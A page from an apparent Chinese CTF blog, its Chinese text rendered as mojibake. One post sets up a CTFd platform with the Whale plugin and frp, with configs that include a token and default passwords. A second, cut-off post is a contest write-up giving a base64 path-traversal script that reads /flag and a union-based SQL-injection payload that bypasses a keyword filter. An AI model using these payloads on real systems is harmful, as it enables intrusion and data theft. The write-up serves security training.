<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = <span class="number">172.18</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">server_port = <span class="number">7897</span></span><br><span class="line">token = jplXcUyxdqn0y2RIzaLTDoaXET5Gbo78</span><br></pre></td></tr></table></figure>

<p>å†ä¿®æ”¹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim ~/frp_0<span class="number">.29</span><span class="number">.0</span>_linux_amd64/frpc.ini</span><br></pre></td></tr></table></figure>

<p><code>frpc.ini</code>çš„å†…å®¹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = <span class="number">172.18</span><span class="number">.0</span><span class="number">.1</span> <span class="comment"># è¿™é‡Œå¡«å†™å®¿ä¸»æœºifconfigä¹‹ådocker0çš„ip</span></span><br><span class="line">server_port = <span class="number">7897</span></span><br><span class="line">token = jplXcUyxdqn0y2RIzaLTDoaXET5Gbo78</span><br><span class="line">admin_addr = <span class="number">172.20</span><span class="number">.0</span><span class="number">.2</span> <span class="comment">#è¿™é‡Œå¡«å†™frpcå®¹å™¨åœ¨frpcadminç½‘ç»œé‡Œçš„ip</span></span><br><span class="line">admin_port = <span class="number">7400</span></span><br><span class="line">log_file = ./frps.log</span><br></pre></td></tr></table></figure>

<h4 id="åˆ›å»ºç½‘ç»œfrpadmin"><a href="#åˆ›å»ºç½‘ç»œfrpadmin" class="headerlink" title="åˆ›å»ºç½‘ç»œfrpadmin"></a><strong>åˆ›å»ºç½‘ç»œfrpadmin</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#åˆ›å»ºç½‘ç»œå¹¶å¯åŠ¨frpcå®¹å™¨å¹¶é…ç½®frpc.ini</span></span><br><span class="line">docker network create ctfd_frp-containers</span><br><span class="line">docker run  -d -v ~/frp_0<span class="number">.29</span><span class="number">.0</span>_linux_amd64/frpc.ini:/etc/frp/frpc.ini --network=<span class="string">&quot;ctfd_frp-containers&quot;</span> --restart=always <span class="string">&quot;glzjin/frp&quot;</span></span><br><span class="line"><span class="comment">#åˆ›å»ºç½‘ç»œfrpcadminç”¨äºctfdå®¹å™¨å’Œfrpcå®¹å™¨é€šä¿¡</span></span><br><span class="line">docker network create frpcadmin</span><br><span class="line">docker network connect frpcadmin &lt;frpcå®¹å™¨åæˆ–è€…ID&gt;</span><br><span class="line"><span class="comment">#é‡å¯dockeræœåŠ¡</span></span><br><span class="line">systemctl restart docker</span><br><span class="line"><span class="comment">#æŸ¥çœ‹frpcadminç½‘ç»œçš„è¿æ¥æƒ…å†µå¹¶è®°å½•frpcå®¹å™¨çš„ç½‘ç»œIP</span></span><br><span class="line">docker network inspect frpcadmin</span><br></pre></td></tr></table></figure>

<h4 id="tokenè„šæœ¬"><a href="#tokenè„šæœ¬" class="headerlink" title="tokenè„šæœ¬"></a><strong>tokenè„šæœ¬</strong></h4><hr>
<p>è¿™é‡Œæœ‰ä¸ªå¯ä»¥ç”Ÿæˆtokençš„è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_token</span>():</span></span><br><span class="line">    length_r = <span class="number">32</span></span><br><span class="line">    token = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    chars = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">    length = len(chars) - <span class="number">1</span></span><br><span class="line">    random = Random()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(length_r):</span><br><span class="line">        token += chars[random.randint(<span class="number">0</span>, length)]</span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"><span class="keyword">print</span> get_token()</span><br></pre></td></tr></table></figure>

<h3 id="å®‰è£…CTFd"><a href="#å®‰è£…CTFd" class="headerlink" title="å®‰è£…CTFd"></a><strong>å®‰è£…CTFd</strong></h3><h4 id="ä¸‹è½½CTFd"><a href="#ä¸‹è½½CTFd" class="headerlink" title="ä¸‹è½½CTFd"></a><strong>ä¸‹è½½CTFd</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">cd</span><br><span class="line">git clone https://github.com/CTFd/CTFd.git</span><br><span class="line">cd CTFd/</span><br><span class="line"><span class="comment">#å›æ»šåˆ°å½“å‰æ•™ç¨‹é€‚åˆçš„ç‰ˆæœ¬</span></span><br><span class="line">git reset <span class="number">6</span>c5c63d667a17aec159c8e26ea53dccfbc4d0fa3 --hard</span><br><span class="line"><span class="comment">#æ‰“å¼€ctfdæ’ä»¶ç›®å½•</span></span><br><span class="line">cd CTFd/plugins</span><br><span class="line">git clone https://github.com/glzjin/CTFd-Whale.git ctfd-whale</span><br><span class="line">cd ctfd-whale</span><br><span class="line"><span class="comment">#å›æ»šåˆ°å½“å‰æ•™ç¨‹é€‚åˆçš„ç‰ˆæœ¬</span></span><br><span class="line">git reset <span class="number">5</span>b32f457e9f56ee9b2b29495f4b3b118be3c57bd --hard</span><br><span class="line"><span class="comment">#è¿”å›ctfdä¸»ç›®å½•</span></span><br><span class="line">cd ../../../</span><br></pre></td></tr></table></figure>

<p>æŠŠåŸç”Ÿçš„CTFdè£…å¥½åæ”¹ä¸€ä¸‹è¿™ä¸ªcssï¼Œè¿™ä¸€æ­¥éå¸¸é‡è¦ï¼Œå› ä¸ºåŸæœ¬çš„ç½‘ç«™è¢«å¢™äº†ï¼Œå¯¼è‡´è®¿é—®éå¸¸æ…¢ï¼Œæ‰€ä»¥éœ€è¦æ¢ä¸€ä¸‹cdnåŠ é€Ÿç‰ˆæœ¬çš„ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /root/CTFd/CTFd/themes/core/static/css/vendor/font-awesome</span><br><span class="line"><span class="comment">#æ‰“å¼€fontawesome-fonts.css</span></span><br><span class="line"><span class="comment">#æŠŠç¬¬ä¸€å¥æ¢æˆ</span></span><br><span class="line"><span class="meta">@import url(&#x27;https://cdn.bootcss.com/font-awesome/5.13.0/css/all.css&#x27;);</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åæ¢ä¸€ä¸‹è¿™ä¸‰ä¸ªæ–‡ä»¶</p>
<h4 id="ä¿®æ”¹Dockerfile"><a href="#ä¿®æ”¹Dockerfile" class="headerlink" title="ä¿®æ”¹Dockerfile"></a><strong>ä¿®æ”¹<code>Dockerfile</code></strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">FROM python:<span class="number">2.7</span>-alpine</span><br><span class="line">RUN sed -i <span class="string">&#x27;s/dl-cdn.alpinelinux.org/mirrors.aliyun.com/g&#x27;</span> /etc/apk/repositories &amp;&amp;\</span><br><span class="line">    apk update &amp;&amp; \</span><br><span class="line">    apk add python python-dev linux-headers libffi-dev gcc make musl-dev py-pip mysql-client git openssl-dev</span><br><span class="line">RUN adduser -D -u <span class="number">1001</span> -s /bin/bash ctfd</span><br><span class="line"></span><br><span class="line">WORKDIR /opt/CTFd</span><br><span class="line">RUN mkdir -p /opt/CTFd /var/log/CTFd /var/uploads</span><br><span class="line">RUN pip config set <span class="keyword">global</span>.index-url https://pypi.doubanio.com/simple</span><br><span class="line">RUN pip config set install.trusted-host pypi.doubanio.com</span><br><span class="line">COPY requirements.txt .</span><br><span class="line"></span><br><span class="line">RUN pip install -r requirements.txt -i  https://pypi.doubanio.com/simple</span><br><span class="line"></span><br><span class="line">COPY . /opt/CTFd</span><br><span class="line"></span><br><span class="line">RUN <span class="keyword">for</span> d <span class="keyword">in</span> CTFd/plugins/*; do \</span><br><span class="line">      <span class="keyword">if</span> [ -f <span class="string">&quot;$d/requirements.txt&quot;</span> ]; then \</span><br><span class="line">        pip install -r $d/requirements.txt -i  https://pypi.doubanio.com/simple; \</span><br><span class="line">      fi; \</span><br><span class="line">    done;</span><br><span class="line"></span><br><span class="line">RUN chmod +x /opt/CTFd/docker-entrypoint.sh</span><br><span class="line">RUN chown -R <span class="number">1001</span>:<span class="number">1001</span> /opt/CTFd</span><br><span class="line">RUN chown -R <span class="number">1001</span>:<span class="number">1001</span> /var/log/CTFd /var/uploads</span><br><span class="line"></span><br><span class="line">USER <span class="number">1001</span></span><br><span class="line">EXPOSE <span class="number">8000</span></span><br><span class="line">ENTRYPOINT [<span class="string">&quot;/opt/CTFd/docker-entrypoint.sh&quot;</span>]</span><br></pre></td></tr></table></figure>

<h4 id="ä¿®æ”¹docker-compose-yml"><a href="#ä¿®æ”¹docker-compose-yml" class="headerlink" title="ä¿®æ”¹docker-compose.yml"></a><strong>ä¿®æ”¹<code>docker-compose.yml</code></strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">version: <span class="string">&#x27;2&#x27;</span></span><br><span class="line"></span><br><span class="line">services:</span><br><span class="line">  ctfd:</span><br><span class="line">    build: .</span><br><span class="line">    user: root</span><br><span class="line">    restart: always</span><br><span class="line">    ports:</span><br><span class="line">      - <span class="string">&quot;8000:8000&quot;</span></span><br><span class="line">    environment:</span><br><span class="line">      - UPLOAD_FOLDER=/var/uploads</span><br><span class="line">      - DATABASE_URL=mysql+pymysql://root:ctfd@db/ctfd</span><br><span class="line">      - REDIS_URL=redis://cache:<span class="number">6379</span></span><br><span class="line">      - WORKERS=<span class="number">1</span></span><br><span class="line">      - LOG_FOLDER=/var/log/CTFd</span><br><span class="line">      - ACCESS_LOG=-</span><br><span class="line">      - ERROR_LOG=-</span><br><span class="line">    volumes:</span><br><span class="line">      - .data/CTFd/logs:/var/log/CTFd</span><br><span class="line">      - .data/CTFd/uploads:/var/uploads</span><br><span class="line">      - .:/opt/CTFd:ro</span><br><span class="line">      - /var/run/docker.sock:/var/run/docker.sock</span><br><span class="line">    depends_on:</span><br><span class="line">      - db</span><br><span class="line">    networks:</span><br><span class="line">        default:</span><br><span class="line">        internal:</span><br><span class="line"></span><br><span class="line">  db:</span><br><span class="line">    image: mariadb:<span class="number">10.4</span><span class="number">.12</span></span><br><span class="line">    restart: always</span><br><span class="line">    environment:</span><br><span class="line">      - MYSQL_ROOT_PASSWORD=ctfd</span><br><span class="line">      - MYSQL_USER=ctfd</span><br><span class="line">      - MYSQL_PASSWORD=ctfd</span><br><span class="line">      - MYSQL_DATABASE=ctfd</span><br><span class="line">    volumes:</span><br><span class="line">      - .data/mysql:/var/lib/mysql</span><br><span class="line">    networks:</span><br><span class="line">        internal:</span><br><span class="line">    <span class="comment"># This command is required to set important mariadb defaults</span></span><br><span class="line">    command: [mysqld, --character-set-server=utf8mb4, --collation-server=utf8mb4_unicode_ci, --wait_timeout=<span class="number">28800</span>, --log-warnings=<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">  cache:</span><br><span class="line">    image: redis:<span class="number">4</span></span><br><span class="line">    restart: always</span><br><span class="line">    volumes:</span><br><span class="line">    - .data/redis:/data</span><br><span class="line">    networks:</span><br><span class="line">        internal:</span><br><span class="line"></span><br><span class="line">networks:</span><br><span class="line">    default:</span><br><span class="line">    internal:</span><br><span class="line">        internal: true</span><br></pre></td></tr></table></figure>

<h4 id="ä¿®æ”¹requirements-txt"><a href="#ä¿®æ”¹requirements-txt" class="headerlink" title="ä¿®æ”¹requirements.txt"></a><strong>ä¿®æ”¹<code>requirements.txt</code></strong></h4><p>åœ¨æœ€ä¸‹é¢æ·»åŠ ä¸€è¡Œ</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">banal==<span class="number">0.4</span><span class="number">.2</span></span><br></pre></td></tr></table></figure>

<p>æ„å»ºå¯åŠ¨é•œåƒã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<p>å°†ctfdè¿æ¥frpcadminç½‘ç»œ</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br><span class="line">docker network connect frpcadmin &lt;ctfdå®¹å™¨åæˆ–è€…ID&gt;</span><br><span class="line">docker network inspect frpcadmin</span><br></pre></td></tr></table></figure>

<h3 id="æ’ä»¶ä¿¡æ¯å¡«å†™"><a href="#æ’ä»¶ä¿¡æ¯å¡«å†™" class="headerlink" title="æ’ä»¶ä¿¡æ¯å¡«å†™"></a><strong>æ’ä»¶ä¿¡æ¯å¡«å†™</strong></h3><p>è¿›å…¥ç½‘ç«™æ’ä»¶å¡«å†™ä¿¡æ¯å³å¯</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Docker API URL</span></span><br><span class="line">unix:///var/run/docker.sock</span><br><span class="line"><span class="comment">#Frp API IP</span></span><br><span class="line"><span class="number">172.20</span><span class="number">.0</span><span class="number">.2</span>  <span class="comment">#frpcå®¹å™¨åœ¨frpcadminç½‘ç»œé‡Œçš„ip</span></span><br><span class="line"><span class="comment">#Frp API Port</span></span><br><span class="line"><span class="number">7400</span></span><br><span class="line"><span class="comment">#Frp Http Domain Suffix</span></span><br><span class="line"><span class="literal">None</span></span><br><span class="line"><span class="comment">#Frp Http Port </span></span><br><span class="line"><span class="number">80</span></span><br><span class="line"><span class="comment">#Frp Direct IP Address</span></span><br><span class="line"><span class="number">39.105</span><span class="number">.158</span><span class="number">.221</span>  <span class="comment">#å…¬ç½‘IP</span></span><br><span class="line"><span class="comment">#Frp Direct Minimum Port </span></span><br><span class="line"><span class="number">28000</span></span><br><span class="line"><span class="comment">#Frp Direct Maximum Port </span></span><br><span class="line"><span class="number">28100</span></span><br><span class="line"><span class="comment">#Max Container Count </span></span><br><span class="line"><span class="number">100</span>         <span class="comment">#æœ€å¤§å®¹å™¨æ•°</span></span><br><span class="line"><span class="comment">#Max Renewal Times </span></span><br><span class="line"><span class="number">5</span>           <span class="comment">#å•ä¸ªå®¹å™¨æœ€å¤§ç»­æœŸæ¬¡æ•°</span></span><br><span class="line"><span class="comment">#Frp config template </span></span><br><span class="line">[common]</span><br><span class="line">server_addr = <span class="number">172.18</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">server_port = <span class="number">7897</span></span><br><span class="line">token = jplXcUyxdqn0y2RIzaLTDoaXET5Gbo78</span><br><span class="line">admin_addr = <span class="number">172.20</span><span class="number">.0</span><span class="number">.2</span></span><br><span class="line">admin_port = <span class="number">7400</span></span><br><span class="line">log_file = ./frps.log</span><br><span class="line"><span class="comment">#Docker Auto Connect Containers </span></span><br><span class="line"><span class="literal">None</span></span><br><span class="line"><span class="comment">#Docker Auto Connect Network </span></span><br><span class="line">ctfd_frp-containers</span><br><span class="line"><span class="comment">#Docker Dns Setting </span></span><br><span class="line"><span class="literal">None</span></span><br></pre></td></tr></table></figure>

<h3 id="å¸¸è§é—®é¢˜"><a href="#å¸¸è§é—®é¢˜" class="headerlink" title="å¸¸è§é—®é¢˜"></a><strong>å¸¸è§é—®é¢˜</strong></h3><p>å¦‚æœå®¹å™¨çš„çŠ¶æ€ä¸ºrestartï¼Œå¯ä»¥ç”¨logsæ¥æŸ¥çœ‹å‘ç”Ÿäº†ä»€ä¹ˆé”™è¯¯</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logs &lt;å®¹å™¨ID&gt;</span><br></pre></td></tr></table></figure>

<h3 id="éƒ¨ç½²webé¢˜ç›®"><a href="#éƒ¨ç½²webé¢˜ç›®" class="headerlink" title="éƒ¨ç½²webé¢˜ç›®"></a><strong>éƒ¨ç½²webé¢˜ç›®</strong></h3><p>åœ¨Dockerfileé‡Œé¢å¡«å†™</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FROM php:<span class="number">7.0</span>-apache</span><br><span class="line">CMD sh -c <span class="string">&quot;echo $FLAG &gt; /flag  &amp;&amp; export FLAG=not_flag &amp;&amp; FLAG=not_flag &amp;&amp; apache2-foreground&quot;</span></span><br></pre></td></tr></table></figure>

<p>å³å¯ç”ŸæˆåŠ¨æ€flag</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.getflag.cn/2020/07/26/%E5%AE%89%E6%81%92%E4%B8%83%E6%9C%88%E8%B5%9B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="http://yuhaojiang.gitee.io/picture/Blogå¤´åƒ.jpg">
      <meta itemprop="name" content="kawhi">
      <meta itemprop="description" content="æ²¡æœ‰æ³¢æ¶›ï¼Œå¦‚ä½•æ±¹æ¶Œ">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="kawhi">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/07/26/%E5%AE%89%E6%81%92%E4%B8%83%E6%9C%88%E8%B5%9B/" class="post-title-link" itemprop="url">å®‰æ’ä¸ƒæœˆèµ›</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2020-07-26 00:00:00" itemprop="dateCreated datePublished" datetime="2020-07-26T00:00:00+08:00">2020-07-26</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2020-10-16 11:53:26" itemprop="dateModified" datetime="2020-10-16T11:53:26+08:00">2020-10-16</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF%E6%AF%94%E8%B5%9B/" itemprop="url" rel="index"><span itemprop="name">CTFæ¯”èµ›</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a><strong>å‰è¨€</strong></h3><p>å°±å‡ é“é¢˜ï¼Œæ°´ä¸€ä¸‹</p>
<h3 id="ezfileinclude"><a href="#ezfileinclude" class="headerlink" title="ezfileinclude"></a><strong>ezfileinclude</strong></h3><p>æ‰“å¼€é¢˜ç›®é“¾æ¥åæ˜¾ç¤ºå‡ºæ¥çš„æ˜¯ä¸€å¼ å›¾ç‰‡ï¼ŒæŸ¥çœ‹ç½‘é¡µæºä»£ç ä¼šåœ¨imgæ ‡ç­¾ç§å‘ç°ä¸€ä¸ª/image.php?t=xxxxx&amp;f=base64(xxxx)</p>
<p>è¿™é“é¢˜ç›®è€ƒç‚¹ä¹Ÿæ˜¯æ–‡ä»¶è¯»å–ï¼Œæ‰€ä»¥åˆ©ç”¨ç‚¹è‚¯å®šåœ¨fè¿™ä¸ªå‚æ•°äº†ï¼Œä½†åªæ˜¯è¿‡æ»¤äº†å¼€å¤´çš„<code>../</code></p>
<p>è¿™é‡Œç”¨ä¸€ä¸‹Hhhmå¸ˆå‚…çš„è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file = <span class="string">&quot;hhhm/../../../../../../../../flag&quot;</span></span><br><span class="line">file = base64.b64encode(file.encode())</span><br><span class="line">url = <span class="string">&quot;http://183.129.189.60:10009/image.php?t=&#123;0&#125;&amp;f=&#123;1&#125;&quot;</span></span><br><span class="line">now = int(time.time())</span><br><span class="line">rep = requests.get(url.format(str(now),file.decode()))</span><br><span class="line">print(rep.text)</span><br></pre></td></tr></table></figure>

<p>æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;t&#x27;</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you miss some parameters&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $timestamp = time();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(abs($_GET[<span class="string">&#x27;t&#x27;</span>] - $timestamp) &gt; <span class="number">10</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;what&#x27;s your time?&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $file = base64_decode($_GET[<span class="string">&#x27;f&#x27;</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(substr($file, <span class="number">0</span>, strlen(<span class="string">&quot;/../&quot;</span>)) === <span class="string">&quot;/../&quot;</span> || substr($file, <span class="number">0</span>, strlen(<span class="string">&quot;../&quot;</span>)) === <span class="string">&quot;../&quot;</span> || substr($file, <span class="number">0</span>, strlen(<span class="string">&quot;./&quot;</span>)) === <span class="string">&quot;./&quot;</span> || substr($file, <span class="number">0</span>, strlen(<span class="string">&quot;/.&quot;</span>)) === <span class="string">&quot;/.&quot;</span> || substr($file, <span class="number">0</span>, strlen(<span class="string">&quot;//&quot;</span>)) === <span class="string">&quot;//&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;You are not allowed to do that.&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;/var/www/html/img/&#x27;</span>.$file);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="Sqil"><a href="#Sqil" class="headerlink" title="Sqil"></a><strong>Sqil</strong></h3><p>é¦–å…ˆfuzzä¹‹åå‘ç°æ­£åˆ™</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(<span class="string">&quot;/;|benchmark|\^|if|[\s]|in|case|when|sleep|auto|desc|stat|\||lock|or|and|&amp;|like|-|`/i&quot;</span>, $id);</span><br></pre></td></tr></table></figure>

<p>å‘ç°è¿‡æ»¤inå’Œorè¢«è¿‡æ»¤äº†ï¼Œæ„å‘³ç€information_schemaä¸èƒ½ä½¿ç”¨</p>
<p>ä¸€èˆ¬æ¥è¯´ç»•è¿‡informationæœ‰ä¸¤ç§</p>
<ul>
<li>sys.x$schema_flattened_keys</li>
<li>sys.schema_table_statistics_with_buffer</li>
</ul>
<p>ä½†æ˜¯ç¬¬äºŒç§é‡Œçš„statè¢«è¿‡æ»¤äº†ï¼Œå¯ä»¥ä½¿ç”¨ç¬¬ä¸€ç§æ–¹æ³•ï¼Œæ³¨å‡ºè¡¨åpayload</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://183.129.189.60:10004/?id=0%27/**/union/**/select/**/1,2,group_concat(table_name)from/**/sys.x$schema_flattened_keys/**/where/**/table_schema=database()%23</span><br></pre></td></tr></table></figure>

<p>å›æ˜¾</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Array ( [0] =&gt; 1 [id] =&gt; 1 [1] =&gt; 2 [username] =&gt; 2 [2] =&gt; flllaaaggg,users [password] =&gt; flllaaaggg,users )</span><br></pre></td></tr></table></figure>

<p>å‘ç°æœ‰flllaaaggg,usersä¸¤ç§è¡¨ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨æ— åˆ—åæ³¨å…¥ï¼Œæ— åˆ—åæ³¨å…¥å¯å‚è€ƒï¼š<a class="foo" href="https://www.jianshu.com/p/6eba3370cfab" target="_blank">ä¸çŸ¥é“åˆ—åçš„æƒ…å†µä¸‹æ³¨å…¥</a></p>
<p>æŸ¥çœ‹usersè¡¨å†…å®¹</p>
